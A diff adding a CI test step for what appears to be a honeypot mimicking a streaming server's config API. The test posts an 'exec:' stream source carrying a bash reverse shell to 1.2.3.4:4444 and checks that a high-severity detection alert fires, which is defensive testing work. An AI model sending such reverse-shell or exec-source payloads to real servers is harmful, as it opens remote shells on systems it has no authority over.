@@ -121,6 +121,28 @@ jobs:
           ! curl -s -H 'Sec-Fetch-Site: same-origin' http://127.0.0.1:19866/api/streams | grep -q ui_pwn
           kill $POT $REAL 2>/dev/null || true
 
+      - name: exec: source detection (the 1.9.x RCE primitive)
+        run: |
+          python3 honeypot.py --port 19869 --rtsp-port 0 --data-dir /tmp/exec-a --quiet --no-color &
+          POT=$!
+          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19869/api >/dev/null && break; sleep 0.5; done
+          # exec: runs its argument in a shell
+          curl -s -o /dev/null -X POST --data-binary \
+            $'streams:\n  ex: exec: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n' \
+            http://127.0.0.1:19869/api/config
+          GOT=$(python3 -c "import json;a=json.loads(open('/tmp/exec-a/alerts.jsonl').readlines()[-1]);print(a['tags'],a['severity'])")
+          echo "exec alert -> $GOT"
+          echo "$GOT" | grep -q exec_source
+          echo "$GOT" | grep -q high
+          # even the innocent-looking form is a command channel
+          curl -s -o /dev/null -X POST --data-binary \
+            $'streams:\n  ex2: exec: echo hello {output}\n' http://127.0.0.1:19869/api/config
+          python3 -c "import json;a=json.loads(open('/tmp/exec-a/alerts.jsonl').readlines()[-1]);assert 'exec_source' in a['tags'],a['tags']"
+          # PUT accepts an exec source like a real 1.9.x does
+          curl -s -o /dev/null -w '%{http_code}' -X PUT \
+            "http://127.0.0.1:19869/api/streams?src=exec:bash&name=ex3" | grep -q 200
+          kill $POT 2>/dev/null || true
+
       - name: Config sync (real config changes propagate, no phantom rows)
         run: |
           printf 'streams:\n  keepme: rtsp://admin:x@10.0.0.1/x\n  ghost: rtsp://admin:y@10.0.0.2/x\n' > /tmp/sync.yaml
